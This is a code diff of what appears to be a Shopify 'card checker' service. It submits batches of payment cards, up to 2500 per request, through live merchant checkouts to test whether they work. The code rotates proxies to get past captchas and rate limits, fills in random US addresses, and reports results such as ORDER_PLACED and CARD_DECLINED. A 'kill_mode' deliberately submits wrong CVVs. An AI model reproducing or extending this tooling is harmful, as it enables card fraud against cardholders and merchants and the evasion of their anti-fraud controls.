+            delivery_line_item = {'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]}, 'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'value': {'amount': shipping_amount_str, 'currencyCode': currency}}, 'destinationChanged': False}
+            if has_destination or is_shipping_required:
+                delivery_line_item['destination'] = {'streetAddress': {'address1': street, 'address2': address2, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}}
+            if delivery_strategy:
+                delivery_line_item['selectedDeliveryStrategy'] = {'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False}, 'options': {}}
+            elif not has_delivery_lines:
+                delivery_line_item['selectedDeliveryStrategy'] = None
+            else:
+                delivery_line_item['selectedDeliveryStrategy'] = {'deliveryStrategyByHandle': {'handle': '', 'customDeliveryRate': False}, 'options': {}}
+
+            if check_only:
+                return True, "Site Checked", gateway, total_price, currency
+
+            submit_variables = {
+                'input': {
+                    'sessionInput': {'sessionToken': sst},
+                    'queueToken': queueToken or '',
+                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
+                    'delivery': {'deliveryLines': [delivery_line_item] if has_delivery_lines else [], 'noDeliveryRequired': [] if has_delivery_lines else [{'stableId': stableId or '1'}], 'useProgressiveRates': True, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True},
+                    'merchandise': {'merchandiseLines': [{'stableId': stableId or '1', 'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{merch}', 'variantId': f'gid://shopify/ProductVariant/{variant_id}', 'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None}}, 'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'value': {'amount': subtotal_str, 'currencyCode': currency}}, 'lineComponentsSource': None, 'lineComponents': []}]},
+                    'payment': {'totalAmount': {'any': True}, 'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': payment_identifier, 'sessionId': token, 'billingAddress': {'streetAddress': {'address1': street, 'address2': address2, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}}, 'cardSource': None}}, 'amount': {'value': {'amount': running_total, 'currencyCode': currency}}, 'dueAt': None}], 'billingAddress': {'streetAddress': {'address1': street, 'address2': address2, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}}},
+                    'buyerIdentity': {'customer': {'presentmentCurrency': currency, 'countryCode': country_code}, 'email': email, 'emailChanged': False, 'phoneCountryCode': country_code, 'marketingConsent': [{'email': {'value': email}}], 'shopPayOptInPhone': {'number': phone, 'countryCode': country_code}, 'rememberMe': False},
+                    'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': tax_amount_str, 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
+                    'tip': {'tipLines': []},
+                    'note': {'message': None, 'customAttributes': []},
+                    'localizationExtension': {'fields': []},
+                    'nonNegotiableTerms': None,
+                    'optionalDuties': {'buyerRefusesDuties': False}
+                },
+                'attemptToken': attempt_token,
+                'metafields': [],
+                'analytics': {'requestUrl': checkout_url}
+            }
+            if checkpoint_data:
+                submit_variables['input']['checkpointData'] = checkpoint_data
+            else:
+                submit_variables['input'].pop('checkpointData', None)
+
+            rid = None
+            for attempt in range(4):
+                submit_json_data = {'query': MUTATION_SUBMIT, 'variables': submit_variables, 'operationName': 'SubmitForCompletion'}
+                response, text, _ = await make_graphql_request_with_captcha_handling(session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1, proxy=proxy)
+                if not response:
+                    if attempt < 3:
+                        await asyncio.sleep(0.8 * (attempt + 1))
+                        continue
+                    break
+                if is_captcha_required(text):
+                    new_proxy = _rotate_fallback_proxy(proxy)
+                    if new_proxy and new_proxy != proxy:
+                        proxy = new_proxy
+                        await asyncio.sleep(1.5)
+                        continue
+                    return False, "Proxy Error: security check on submit", gateway, total_price, currency
+                if "429" in text or "Too Many Requests" in text:
+                    _record_proxy_fail(proxy)
+                    new_proxy = _rotate_fallback_proxy(proxy)
+                    if new_proxy and new_proxy != proxy:
+                        proxy = new_proxy
+                    await asyncio.sleep(min((2 ** attempt) + random.uniform(0, 2), 60))
+                    continue
+                if "Your order total has changed." in text:
+                    try:
+                        submit_variables['input']['payment']['paymentLines'][0]['amount'] = {'any': True}
+                        if 'totalAmount' in submit_variables['input']['payment']:
+                            submit_variables['input']['payment']['totalAmount'] = {'any': True}
+                        submit_variables['input']['taxes']['proposedTotalAmount'] = {'any': True}
+                        if submit_variables['input']['merchandise'].get('merchandiseLines'):
+                            submit_variables['input']['merchandise']['merchandiseLines'][0]['expectedTotalPrice'] = {'any': True}
+                        if submit_variables['input']['delivery'].get('deliveryLines'):
+                            submit_variables['input']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {'any': True}
+                    except Exception:
+                        pass
+                    if attempt < 3:
+                        await asyncio.sleep(0.3)
+                        continue
+                    return False, "ORDER_TOTAL_CHANGED", gateway, total_price, currency
+                if "The requested payment method is not available." in text:
+                    return False, "Payment method not available", gateway, total_price, currency
+
+                try:
+                    resp_json = safe_json_loads(text)
+                    if not resp_json:
+                        return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency
+                    submit_data = (resp_json.get('data') or {}).get('submitForCompletion', {})
+                    if not submit_data:
+                        errors = resp_json.get('errors', [])
+                        if errors:
+                            for error in errors:
+                                code = error.get('code')
+                                if code:
+                                    return False, code, gateway, total_price, currency
+                                msg = error.get('message')
+                                if msg:
+                                    return False, f"GQL Err: {msg}", gateway, total_price, currency
+                        return False, f"Empty submit response: {text[:50]}", gateway, total_price, currency
+                    result_type = submit_data.get('__typename', '')
+
+                    if result_type == 'Throttled':
+                        queueToken = submit_data.get('queueToken') or queueToken
+                        submit_variables['input']['queueToken'] = queueToken
+                        if attempt < 3:
+                            await asyncio.sleep(min(submit_data.get('pollAfter', 2.0) * (1 + attempt * 0.5), 10.0))
+                            continue
+                        else:
+                            new_proxy = _rotate_fallback_proxy(proxy)
+                            if new_proxy:
+                                proxy = new_proxy
+                                continue
+                            return False, "RATE_LIMITED_429", gateway, total_price, currency
+
+                    if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
+                        receipt = submit_data.get('receipt', {})
+                        if receipt:
+                            if receipt.get('__typename') == 'ProcessedReceipt':
+                                return True, "ORDER_PLACED", gateway, total_price, currency
+                            rid = receipt.get('id')
+                            if not rid:
+                                return True, "ORDER_PLACED", gateway, total_price, currency
+                        else:
+                            return True, "ORDER_PLACED", gateway, total_price, currency
+                        break
+
+                    elif result_type == 'SubmitFailed':
+                        reason = submit_data.get('reason', '')
+                        localized = submit_data.get('localizedMessage', '') or submit_data.get('nonLocalizedMessage', '')
+                        return False, (localized or extract_clean_response(reason) or 'CARD_DECLINED'), gateway, total_price, currency
+
+                    elif result_type == 'SubmitRejected':
+                        errors = submit_data.get('errors', [])
+                        has_recoverable = False
+                        hard_msg = None
+                        if errors:
+                            recoverable_codes = {'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED', 'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT', 'DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED', 'REQUIRED_ARTIFACTS_UNAVAILABLE', 'BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH', 'MERCHANDISE_EXPECTED_PRICE_MISMATCH', 'DESTINATION_ADDRESS_REQUIRED', 'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE', 'DELIVERY_COMPANY_REQUIRED', 'TAX_NEW_TAX_MUST_BE_ACCEPTED', 'PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH', 'MERCHANDISE_PRODUCT_NOT_PUBLISHED_IN_BUYER_LOCATION', 'PAYMENTS_ZONE_NOT_FOUND'}
+                            hard_codes = {'PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT', 'PAYMENTS_CREDIT_CARD_EXPIRED', 'PAYMENTS_CREDIT_CARD_GENERIC_DECLINE', 'PAYMENTS_CREDIT_CARD_CARD_DECLINED', 'PAYMENTS_CREDIT_CARD_VELOCITY_EXCEEDED', 'PAYMENTS_CREDIT_CARD_STOLEN_CARD', 'PAYMENTS_CREDIT_CARD_PICK_UP_CARD', 'PAYMENTS_CREDIT_CARD_CVV_MISMATCH', 'PAYMENT_AMOUNT_TOO_SMALL', 'CARD_DECLINED', 'PAYMENT_FAILED'}
+                            for error in errors:
+                                code = error.get('code', '')
+                                emsg = (error.get('localizedMessage', '') or error.get('nonLocalizedMessage', '') or '').lower()
+                                if code in hard_codes:
+                                    hard_msg = code
+                                    break
+                                if code in recoverable_codes or "total has changed" in emsg or "delivery details" in emsg or "currency" in emsg or "price" in emsg:
+                                    has_recoverable = True
+                        if hard_msg:
+                            return False, hard_msg, gateway, total_price, currency
+                        if has_recoverable and attempt < 3:
+                            seller_prop = submit_data.get('sellerProposal')
+                            if seller_prop:
+                                new_currency = None
+                                for path in [('total', 'value', 'currencyCode'), ('runningTotal', 'value', 'currencyCode')]:
+                                    cur = seller_prop
+                                    for p in path:
+                                        cur = (cur or {}).get(p) if isinstance(cur, dict) else None
+                                    if cur:
+                                        new_currency = cur
+                                        break
+                                if not new_currency:
+                                    sm = (seller_prop.get('merchandise') or {}).get('merchandiseLines') or []
+                                    if sm:
+                                        new_currency = ((sm[0].get('totalAmount') or {}).get('value') or {}).get('currencyCode')
+                                if new_currency:
+                                    currency = new_currency
+                                    submit_variables['input']['buyerIdentity']['customer']['presentmentCurrency'] = new_currency
+                                    submit_variables['input']['taxes']['proposedTotalAmount']['value']['currencyCode'] = new_currency
+                                new_running = ((seller_prop.get('runningTotal') or {}).get('value') or {}).get('amount')
+                                if new_running:
+                                    submit_variables['input']['payment']['paymentLines'][0]['amount']['value']['amount'] = new_running
+                                new_tax_str = '0.00'
+                                nt = seller_prop.get('tax') or {}
+                                if nt.get('__typename') == 'FilledTaxTerms':
+                                    new_tax_str = ((nt.get('totalTaxAmount') or {}).get('value') or {}).get('amount', '0.00')
+                                submit_variables['input']['taxes']['proposedTotalAmount']['value']['amount'] = new_tax_str
+                                has_dest_req = False
+                                for e in errors:
+                                    code = e.get('code', '')
+                                    if code == 'DESTINATION_ADDRESS_REQUIRED':
+                                        has_dest_req = True
+                                        is_shipping_required = True
+                                    elif code in ('MERCHANDISE_PRODUCT_NOT_PUBLISHED_IN_BUYER_LOCATION', 'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE', 'PAYMENTS_ZONE_NOT_FOUND', 'PAYMENTS_POSTAL_CODE_REQUIRED'):
+                                        country_code = 'US'
+                                        address_info = book['US']
+                                        street = f"{address_info['address1']} Apt {random.randint(1, 999)}"
+                                        city = address_info['city']
+                                        state = address_info['zoneCode']
+                                        s_zip = address_info['postalCode']
+                                        has_dest_req = True
+                                        is_shipping_required = True
+                                if has_dest_req:
+                                    new_line = {'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]}, 'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': True, 'destination': {'streetAddress': {'address1': street, 'address2': address2 or '', 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}}, 'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}}}
+                                    submit_variables['input']['delivery']['deliveryLines'] = [new_line]
+                                    submit_variables['input']['delivery']['noDeliveryRequired'] = []
+                                await asyncio.sleep(0.2)
+                                continue
+
+                        if errors:
+                            for error in errors:
+                                code = error.get('code', '')
+                                localized_msg = (error.get('localizedMessage', '') or error.get('localizedMessageHtml', '') or error.get('nonLocalizedMessage', ''))
+                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and localized_msg:
+                                    return False, localized_msg, gateway, total_price, currency
+                                if code:
+                                    if code == 'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT' or "total has changed" in localized_msg.lower():
+                                        with _VARIANT_CACHE_LOCK:
+                                            _VARIANT_CACHE.pop(normalize_cache_key(ourl), None)
+                                        return False, "PRICE_TOO_HIGH", gateway, total_price, currency
+                                    if code == 'VALIDATION_CUSTOM' and localized_msg:
+                                        return False, localized_msg, gateway, total_price, currency
+                                    return False, code, gateway, total_price, currency
+                                if localized_msg:
+                                    return False, localized_msg, gateway, total_price, currency
+                        return False, "CARD_DECLINED", gateway, total_price, currency
+
+                    receipt = submit_data.get('receipt', {})
+                    if not receipt:
+                        return False, f"No receipt in submit response (type: {result_type})", gateway, total_price, currency
+                    rid = receipt.get('id')
+                    if not rid:
+                        return False, "No receipt ID", gateway, total_price, currency
+                    break
+                except Exception as e:
+                    return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency
+
+            if not rid:
+                return False, "GATEWAY_TIMEOUT", gateway, total_price, currency
+
+            params = {'operationName': 'PollForReceipt'}
+            poll_json_data = {'query': QUERY_POLL, 'variables': {'receiptId': rid, 'sessionToken': sst}, 'operationName': 'PollForReceipt'}
+            for i in range(6):
+                response, final_text, _ = await make_graphql_request_with_captcha_handling(session, graphql_url, params, headers, poll_json_data, checkout_url, max_retries=0)
+                if is_captcha_required(final_text):
+                    return True, "CARD_DECLINED", gateway, total_price, currency
+                try:
+                    poll_json = safe_json_loads(final_text)
+                    if not poll_json:
+                        continue
+                    receipt_data = (poll_json.get('data') or {}).get('receipt') or {}
+                    if receipt_data:
+                        typename = receipt_data.get('__typename', '')
+                        if typename == 'ProcessedReceipt':
+                            _record_proxy_success(proxy)
+                            return True, "ORDER_PLACED", gateway, total_price, currency
+                        elif typename == 'FailedReceipt':
+                            error = receipt_data.get('processingError', {})
+                            error_type = error.get('__typename', '')
+                            code = error.get('code') or error_type or 'UNKNOWN_ERROR'
+                            msg = error.get('messageUntranslated', '')
+                            if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
+                                return True, msg, gateway, total_price, currency
+                            return True, code, gateway, total_price, currency
+                        elif typename == 'ActionRequiredReceipt':
+                            return True, "OTP_REQUIRED", gateway, total_price, currency
+                        elif typename in ('ProcessingReceipt', 'WaitingReceipt'):
+                            await asyncio.sleep(0.2)
+                            continue
+                except Exception:
+                    pass
+                if 'WaitingReceipt' in final_text or 'ProcessingReceipt' in final_text:
+                    await asyncio.sleep(0.2)
+                else:
+                    break
+
+            if 'CAPTCHA_REQUIRED' in final_text:
+                return True, "CARD_DECLINED", gateway, total_price, currency
+            if 'WaitingReceipt' in final_text or 'ProcessingReceipt' in final_text:
+                return False, "GATEWAY_TIMEOUT", gateway, total_price, currency
+            try:
+                res_json = safe_json_loads(final_text)
+                if not res_json:
+                    return False, "GATEWAY_TIMEOUT", gateway, total_price, currency
+                receipt_obj = (res_json.get('data') or {}).get('receipt') or {}
+                err_data = receipt_obj.get('processingError', {}) if receipt_obj else {}
+                if err_data:
+                    code = err_data.get('code')
+                    msg = err_data.get('messageUntranslated')
+                    if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '', None) and msg:
+                        return True, msg, gateway, total_price, currency
+                    return True, code or "PAYMENT_FAILED", gateway, total_price, currency
+                if "shopify_payments" in str(res_json) or (receipt_obj and receipt_obj.get('__typename') == 'ProcessedReceipt'):
+                    return True, "ORDER_PLACED", gateway, total_price, currency
+                return True, "MISMATCHED_BILL", gateway, total_price, currency
+            except Exception:
+                pass
+            code = extract_between(final_text, '{"code":"', '"')
+            final_lower = final_text.lower()
+            if 'actionreq' in final_lower or 'action_required' in final_lower:
+                return True, "OTP_REQUIRED", gateway, total_price, currency
+            elif 'processedreceipt' in final_lower:
+                return True, "ORDER_PLACED", gateway, total_price, currency
+            elif 'failedreceipt' in final_lower or 'declined' in final_lower:
+                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
+            return False, "Proxy Error: Unknown Result", gateway, total_price, currency
+
+    except asyncio.TimeoutError:
+        _record_proxy_fail(proxy)
+        return False, "Request Timeout", gateway, total_price, currency
+    except Exception as e:
+        err_msg = str(e)
+        err_lower = err_msg.lower()
+        if "gaierror" in err_lower or "getaddrinfo" in err_lower or ("dns" in err_lower and "resolution" in err_lower):
+            _record_proxy_fail(proxy)
+            return False, "DNS resolution failed (site offline/invalid)", gateway, total_price, currency
+        if any(marker in err_lower for marker in _CURL_RETRY_ERRORS):
+            _record_proxy_fail(proxy)
+            return False, f"Proxy Error: {err_msg}", gateway, total_price, currency
+        if any(t in err_lower for t in ('timeout', 'timed out', 'time out', 'asyncio.timeout')):
+            _record_proxy_fail(proxy)
+            return False, f"Request Timeout: {err_msg}", gateway, total_price, currency
+        logger.error(f"[{cc}] Error processing card: {err_msg}")
+        _record_proxy_fail(proxy)
+        return False, f"Error Processing Card: {err_msg}", gateway, total_price, currency
+
+
+# ============================================================
+# Concurrency Engine
+# ============================================================
+MAX_CONCURRENT = int(os.environ.get("MAX_CONCURRENT", "50000"))
 _loop = None
 _loop_thread = None
 _loop_lock = threading.Lock()
@@ -1065,26 +1998,24 @@ _user_semaphores = {}
 _user_semaphore_refs = {}
 ACTIVE_WORKERS = 0
 
+
 async def _shutdown_background_resources():
     current = asyncio.current_task()
-    pending = [task for task in asyncio.all_tasks() if task is not current and not task.done()]
+    pending = [t for t in asyncio.all_tasks() if t is not current and not t.done()]
     for task in pending:
         task.cancel()
     if pending:
         await asyncio.gather(*pending, return_exceptions=True)
-
     sessions = []
     with _SESSION_POOL_STATE_LOCK:
         for pool in _SESSION_POOL.values():
             sessions.extend(pool)
         _SESSION_POOL.clear()
-
     for session in sessions:
         try:
             await session.close()
-        except Exception as exc:
-            logger.debug("Suppressed exception while closing pooled session: %s", exc, exc_info=True)
-
+        except Exception:
+            pass
     global _global_connector, _global_connector_loop
     connector = _global_connector
     _global_connector = None
@@ -1092,14 +2023,14 @@ async def _shutdown_background_resources():
     if connector is not None and not connector.closed:
         try:
             await connector.close()
-        except Exception as exc:
-            logger.debug("Suppressed exception while closing connector: %s", exc, exc_info=True)
-
+        except Exception:
+            pass
     _user_semaphores.clear()
     _user_semaphore_refs.clear()
     _PER_SITE_SEMAPHORES.clear()
     _PER_SITE_SEMAPHORE_REFS.clear()
-
+    _CHECKOUT_PROXIES.clear()
+    _PROXY_STATS.clear()
     global _SESSION_POOL_LOCK, _PER_SITE_LOCK, _semaphore
     _SESSION_POOL_LOCK = None
     _PER_SITE_LOCK = None
@@ -1128,7 +2059,6 @@ def stop_background_loop(timeout=10):
             return
         if threading.current_thread() is thread:
             return
-
         if thread.is_alive():
             try:
                 future = asyncio.run_coroutine_threadsafe(_shutdown_background_resources(), loop)
@@ -1137,52 +2067,59 @@ def stop_background_loop(timeout=10):
                 logger.debug("Background resource shutdown failed: %s", exc, exc_info=True)
             try:
                 loop.call_soon_threadsafe(loop.stop)
-            except Exception as exc:
-                logger.debug("Unable to stop background loop: %s", exc, exc_info=True)
+            except Exception:
+                pass
             thread.join(timeout=timeout)
-
         if not thread.is_alive() and not loop.is_closed():
             try:
                 loop.close()
-            except Exception as exc:
-                logger.debug("Unable to close background loop: %s", exc, exc_info=True)
+            except Exception:
+                pass
             _loop = None
             _loop_thread = None
 
 
-# التحسين: دالة get_event_loop مع Lock للحماية
 def get_event_loop():
     global _loop, _loop_thread
     with _loop_lock:
-        loop_alive = (
-            _loop is not None
-            and not _loop.is_closed()
-            and _loop_thread is not None
-            and _loop_thread.is_alive()
-        )
+        loop_alive = (_loop is not None and not _loop.is_closed() and _loop_thread is not None and _loop_thread.is_alive())
         if not loop_alive:
             _loop = asyncio.new_event_loop()
-            _loop_thread = threading.Thread(
-                target=_start_background_loop,
-                args=(_loop,),
-                daemon=True,
-                name="background-asyncio-loop",
-            )
+            _loop_thread = threading.Thread(target=_start_background_loop, args=(_loop,), daemon=True, name="background-asyncio-loop")
             _loop_thread.start()
         return _loop
+
+
+async def _prewarm_session_pool():
+    try:
+        for profile in _BROWSER_PROFILES:
+            imp = profile["impersonate"]
+            pool = _SESSION_POOL.setdefault(imp, [])
+            while len(pool) < 5:
+                try:
+                    s = AsyncSession(impersonate=imp)
+                    try:
+                        s._impersonate = imp
+                        s._shopify_uses = 0
+                    except Exception:
+                        pass
+                    pool.append(s)
+                except Exception:
+                    break
+        logger.info(f"[PREWARM] {sum(len(v) for v in _SESSION_POOL.values())} sessions ready")
+    except Exception as exc:
+        logger.debug("Prewarm failed: %s", exc, exc_info=True)
+
 
 async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_str, timeout_sec=40, check_only=False, uid=None):
     global _semaphore, _user_semaphores, _user_semaphore_refs, ACTIVE_WORKERS
     if _semaphore is None:
         _semaphore = asyncio.Semaphore(MAX_CONCURRENT)
-
     safe_uid = str(uid) if uid else "unknown"
     if safe_uid not in _user_semaphores:
-        _user_semaphores[safe_uid] = asyncio.Semaphore(500)
+        _user_semaphores[safe_uid] = asyncio.Semaphore(50)
         _user_semaphore_refs[safe_uid] = 0
     _user_semaphore_refs[safe_uid] = _user_semaphore_refs.get(safe_uid, 0) + 1
-
-    logger.info(f"[{cc}] Acquired semaphores, waiting...")
     try:
         async with _semaphore:
             async with _user_semaphores[safe_uid]:
@@ -1190,53 +2127,34 @@ async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_str,
                 try:
                     MAX_OUTER_RETRIES = 2
                     for outer_attempt in range(MAX_OUTER_RETRIES + 1):
-                        logger.info(f"[{cc}] Calling process_card (outer attempt {outer_attempt + 1})...")
-                        success, message, gateway, price, currency = await process_card(
-                            cc, mes, ano, cvv, site_url, variant_id, proxy_str, timeout_sec, check_only=check_only, uid=uid
-                        )
-
-                        # التحسين: معالجة PRICE_TOO_HIGH مع مسح الكاش وإعادة المحاولة
-                        if (not success and
-                                isinstance(message, str) and
-                                'PRICE_TOO_HIGH' in message.upper()):
+                        success, message, gateway, price, currency = await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str, timeout_sec, check_only=check_only, uid=uid)
+                        if (not success and isinstance(message, str) and 'PRICE_TOO_HIGH' in message.upper()):
                             if outer_attempt < MAX_OUTER_RETRIES:
-                                cache_key = normalize_cache_key(site_url)
-                                if cache_key in _VARIANT_CACHE:
-                                    del _VARIANT_CACHE[cache_key]
-                                logger.info(f"[{cc}] PRICE_TOO_HIGH — clearing cache and retrying "
-                                          f"(attempt {outer_attempt + 2}/{MAX_OUTER_RETRIES + 1})...")
+                                with _VARIANT_CACHE_LOCK:
+                                    _VARIANT_CACHE.pop(normalize_cache_key(site_url), None)
                                 await asyncio.sleep(0.5)
                                 continue
-                            else:
-                                message = "PRICE_TOO_HIGH"
-
-                        if (not success and
-                                isinstance(message, str) and
-                                'ORDER_TOTAL_CHANGED' in message.upper()):
+                            message = "PRICE_TOO_HIGH"
+                        if (not success and isinstance(message, str) and 'ORDER_TOTAL_CHANGED' in message.upper()):
                             if outer_attempt < MAX_OUTER_RETRIES:
-                                cache_key = normalize_cache_key(site_url)
-                                if cache_key in _VARIANT_CACHE:
-                                    del _VARIANT_CACHE[cache_key]
-                                logger.info(f"[{cc}] ORDER_TOTAL_CHANGED — session expired, retrying full checkout "
-                                          f"(attempt {outer_attempt + 2}/{MAX_OUTER_RETRIES + 1})...")
+                                with _VARIANT_CACHE_LOCK:
+                                    _VARIANT_CACHE.pop(normalize_cache_key(site_url), None)
                                 await asyncio.sleep(0.5)
                                 continue
-                            else:
-                                message = "DYNAMIC_PRICING_UNSUPPORTED"
-
-                        if (not success and
-                                isinstance(message, str) and
-                                ('CAPTCHA_REQUIRED' in message.upper() or
-                                 any(kw in message for kw in ('Proxy Error:', 'Request Timeout:', 'Proxy Error: Request failed')))):
+                            message = "DYNAMIC_PRICING_UNSUPPORTED"
+                        if (not success and isinstance(message, str) and ('CAPTCHA_REQUIRED' in message.upper() or any(kw in message for kw in ('Proxy Error:', 'Request Timeout:', 'Proxy Error: Request failed')))):
                             return success, message, gateway, price, currency
-
+                        if (not success and isinstance(message, str) and 'AMBIGUOUS' in message.upper()):
+                            if outer_attempt < MAX_OUTER_RETRIES:
+                                with _VARIANT_CACHE_LOCK:
+                                    _VARIANT_CACHE.pop(normalize_cache_key(site_url), None)
+                                await asyncio.sleep(1.0)
+                                continue
                         return success, message, gateway, price, currency
                     return success, message, gateway, price, currency
                 finally:
                     ACTIVE_WORKERS -= 1
-
     finally:
-
         refs = _user_semaphore_refs.get(safe_uid, 0) - 1
         if refs <= 0:
             _user_semaphore_refs.pop(safe_uid, None)
@@ -1244,10 +2162,8 @@ async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_str,
         else:
             _user_semaphore_refs[safe_uid] = refs
 
-# ═══════════════════════════════════════════════════════════════════
-# التحسين: دالة _parse_timeout_value
+
 def _parse_timeout_value(value, default):
-    """Parse a request timeout while preserving existing defaults."""
     if value is None or value == "":
         return default
     try:
@@ -1257,11 +2173,12 @@ def _parse_timeout_value(value, default):
     return parsed if parsed > 0 else default
 
 
-# ──────────────────────── Flask App ─────────────────────────────────
-
+# ============================================================
+# Flask App
+# ============================================================
 app = Flask(__name__)
 
-# ── Single-card endpoint ──────────────────────────────────────────────
+
 @app.route('/shopify', methods=['GET'])
 def shopify_checker():
     try:
@@ -1269,12 +2186,10 @@ def shopify_checker():
         cc_string = request.args.get('cc')
         proxy_str = request.args.get('proxy')
         uid = request.args.get('uid')
-
         if not site:
             return jsonify({"error": "Missing 'site' parameter", "status": False}), 400
         if not cc_string:
             return jsonify({"error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV", "status": False}), 400
-
         try:
             cc_parts = parse_cc_string(cc_string)
             if request.args.get('kill_mode'):
@@ -1285,41 +2200,18 @@ def shopify_checker():
                 cc_parts['cvv'] = wrong_cvv
         except ValueError as e:
             return jsonify({"error": str(e), "status": False}), 400
-
         variant_id = request.args.get('variant')
         loop = get_event_loop()
-
-        timeout_val = request.args.get('timeout')
-        timeout_sec = _parse_timeout_value(timeout_val, 45)
-
-        check_only_val = request.args.get('check_only', '0')
-        check_only = check_only_val in ('1', 'true', 'True')
-
-        logger.info(f"[{cc_string}] Submitting to event loop...")
-        future_timeout = timeout_sec + 60
-        future = asyncio.run_coroutine_threadsafe(
-            _throttled_process(
-                cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'],
-                site, variant_id, proxy_str, timeout_sec, check_only=check_only, uid=uid
-            ),
-            loop
-        )
-        logger.info(f"[{cc_string}] Waiting for future (timeout={future_timeout}s)...")
-        success, message, gateway, price, currency = future.result(timeout=future_timeout)
-        logger.info(f"[{cc_string}] Future completed.")
-
+        timeout_sec = _parse_timeout_value(request.args.get('timeout'), 45)
+        check_only = request.args.get('check_only', '0') in ('1', 'true', 'True')
+        future = asyncio.run_coroutine_threadsafe(_throttled_process(cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'], site, variant_id, proxy_str, timeout_sec, check_only=check_only, uid=uid), loop)
+        success, message, gateway, price, currency = future.result(timeout=timeout_sec + 60)
         return jsonify(_build_result(cc_string, success, message, gateway, price, currency, site))
-
     except Exception as e:
         logger.error(f"Error in shopify_checker: {e}")
-        return jsonify({
-            "error": str(e), "status": False,
-            "Gateway": "UNKNOWN", "Price": 0.0,
-            "Response": f"ERROR: {str(e)}",
-            "cc": request.args.get('cc', '')
-        }), 500
+        return jsonify({"error": str(e), "status": False, "Gateway": "UNKNOWN", "Price": 0.0, "Response": f"ERROR: {str(e)}", "cc": request.args.get('cc', '')}), 500
 
-# ── Batch endpoint ────────────────────────────────────────────────────
+
 @app.route('/batch', methods=['POST'])
 def batch_checker():
     try:
@@ -1328,22 +2220,19 @@ def batch_checker():
         cards = data.get('cards', [])
         variant_id = data.get('variant')
         uid = data.get('uid')
-
         proxy_list = data.get('proxies', [])
         single_proxy = data.get('proxy')
         if not proxy_list and single_proxy:
             proxy_list = [single_proxy]
-
         if not site:
             return jsonify({"error": "Missing 'site' field", "status": False}), 400
         if not cards or not isinstance(cards, list):
             return jsonify({"error": "Missing or invalid 'cards' array", "status": False}), 400
         if len(cards) > 2500:
-            return jsonify({"error": f"Max 2500 cards per batch request. Please chunk your lists.", "status": False}), 400
-
+            return jsonify({"error": "Max 2500 cards per batch request.", "status": False}), 400
         parsed = []
         for i, cc_string in enumerate(cards):
-            proxy_for_card = proxy_list[i % len(proxy_list)] if proxy_list else None
+            px = proxy_list[i % len(proxy_list)] if proxy_list else None
             try:
                 parts = parse_cc_string(cc_string.strip())
                 if data.get('kill_mode'):
@@ -1352,13 +2241,10 @@ def batch_checker():
                     while wrong_cvv == real_cvv:
                         wrong_cvv = str(random.randint(0, (10**len(real_cvv))-1)).zfill(len(real_cvv))
                     parts['cvv'] = wrong_cvv
-                parsed.append((cc_string.strip(), parts, proxy_for_card))
+                parsed.append((cc_string.strip(), parts, px))
             except ValueError:
-                parsed.append((cc_string.strip(), None, proxy_for_card))
-
-        timeout_val = data.get('timeout')
-        timeout_sec = _parse_timeout_value(timeout_val, 40)
-
+                parsed.append((cc_string.strip(), None, px))
+        timeout_sec = _parse_timeout_value(data.get('timeout'), 40)
         loop = get_event_loop()
 
         async def _run_batch():
@@ -1371,90 +2257,98 @@ def batch_checker():
                 else:
                     async def _check(cs=cc_string, p=parts, prx=px):
                         try:
-                            success, msg, gw, price, cur = await _throttled_process(
-                                p['cc'], p['mes'], p['ano'], p['cvv'],
-                                site, variant_id, prx, timeout_sec, uid=uid
-                            )
